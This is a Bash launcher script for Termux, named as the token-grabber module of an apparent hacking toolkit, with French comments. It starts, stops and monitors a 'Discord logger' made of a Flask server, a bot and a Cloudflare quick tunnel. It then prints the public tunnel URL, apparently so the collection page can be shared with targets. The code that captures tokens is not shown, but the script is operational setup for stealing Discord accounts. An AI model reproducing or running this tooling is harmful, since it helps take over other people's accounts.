#!/data/data/com.termux/files/usr/bin/bash
# language: Bash, file: modules/05_token_grabber.sh
# Launcher pour le logger Discord — bot + flask + tunnel

LOGGER_DIR="$HOME/logger"

clear
echo -e "\033[1;36mLe Bot Dans Le Discord\033[0m"
echo ""

# vérifie que le logger existe
if [ ! -d "$LOGGER_DIR" ]; then
    echo -e "\033[1;31m[!] Dossier $LOGGER_DIR introuvable\033[0m"
    echo "  Le logger doit être installé dans ~/logger."
    read -p "Entrée..."; exit 0
fi

# statut des process
is_running() {
    pgrep -f "$1" > /dev/null 2>&1
}

echo "[*] état des services :"
if is_running "python server.py"; then
    echo -e "  \033[1;32m[+]\033[0m serveur Flask : actif"
    SERVER_OK=1
else
    echo -e "  \033[1;31m[-]\033[0m serveur Flask : inactif"
    SERVER_OK=0
fi

if is_running "python bot.py"; then
    echo -e "  \033[1;32m[+]\033[0m bot Discord : actif"
    BOT_OK=1
else
    echo -e "  \033[1;31m[-]\033[0m bot Discord : inactif"
    BOT_OK=0
fi

if is_running "cloudflared"; then
    echo -e "  \033[1;32m[+]\033[0m tunnel Cloudflare : actif"
    TUNNEL_OK=1
else
    echo -e "  \033[1;31m[-]\033[0m tunnel Cloudflare : inactif"
    TUNNEL_OK=0
fi

echo ""

# menu actions
echo "  1) Démarrer tout"
echo "  2) Arrêter tout"
echo "  3) Redémarrer tout"
echo "  4) Voir le statut détaillé"
echo "  5) Afficher l'URL du tunnel"
echo "  0) Retour"
echo ""
read -p "Choix > " ACTION

case $ACTION in
    1)  # démarrage
        termux-wake-lock 2>/dev/null
        if [ "$SERVER_OK" = "0" ]; then
            cd "$LOGGER_DIR"
            nohup python server.py > "$LOGGER_DIR/server.log" 2>&1 &
            echo -e "\033[1;32m[+]\033[0m serveur lancé (log : ~/logger/server.log)"
        fi
        if [ "$TUNNEL_OK" = "0" ]; then
            nohup cloudflared tunnel --url http://localhost:8080 > "$LOGGER_DIR/tunnel.log" 2>&1 &
            echo -e "\033[1;32m[+]\033[0m tunnel lancé (log : ~/logger/tunnel.log)"
            sleep 5
        fi
        if [ "$BOT_OK" = "0" ]; then
            cd "$LOGGER_DIR"
            nohup python bot.py > "$LOGGER_DIR/bot.log" 2>&1 &
            echo -e "\033[1;32m[+]\033[0m bot lancé (log : ~/logger/bot.log)"
        fi
        echo ""
        echo "[*] affichage de l'URL du tunnel..."
        sleep 2
        grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOGGER_DIR/tunnel.log" | head -1
        ;;
    2)  # arrêt
        pkill -f "python server.py" && echo -e "\033[1;31m[-]\033[0m serveur arrêté"
        pkill -f "python bot.py" && echo -e "\033[1;31m[-]\033[0m bot arrêté"
        pkill -f "cloudflared" && echo -e "\033[1;31m[-]\033[0m tunnel arrêté"
        ;;
    3)  # redémarrage
        pkill -f "python server.py"
        pkill -f "python bot.py"
        pkill -f "cloudflared"
        sleep 2
        bash "$0"
        exit 0
        ;;
    4)  # statut détaillé
        echo ""
        echo "--- SERVEUR (10 dernières lignes) ---"
        tail -10 "$LOGGER_DIR/server.log" 2>/dev/null || echo "(pas de log)"
        echo ""
        echo "--- TUNNEL (10 dernières lignes) ---"
        tail -10 "$LOGGER_DIR/tunnel.log" 2>/dev/null || echo "(pas de log)"
        echo ""
        echo "--- BOT (10 dernières lignes) ---"
        tail -10 "$LOGGER_DIR/bot.log" 2>/dev/null || echo "(pas de log)"
        ;;
    5)  # URL
        echo ""
        echo "[*] URL du tunnel :"
        grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOGGER_DIR/tunnel.log" 2>/dev/null | head -1 || \
            echo "  (pas d'URL — le tunnel est-il lancé ?)"
        ;;
    0)  exit 0 ;;
    *)  echo "[!] invalide" ;;
esac

echo ""
read -p "Entrée pour revenir au menu..."

